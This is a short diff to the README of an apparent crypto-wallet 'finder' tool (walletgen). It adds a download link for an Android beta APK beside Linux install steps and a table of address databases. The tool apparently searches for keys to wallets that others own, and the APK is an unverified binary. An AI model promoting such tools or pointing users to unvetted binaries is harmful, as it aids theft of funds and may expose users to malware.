@@ -105,6 +105,9 @@ tar -xzf walletgen-v1.5.0-linux.tar.gz
 cd walletgen
 ./walletgen
 ```
+## Android (Beta)
+- Download [walletgen-beta.apk](https://github.com/tony-dev1/crypto-wallets-finder/releases/download/walletgen/walletgen-android-beta.apk) (15MB)
+
 ### Download and Use Database (for more speed)
 | Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
 |---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
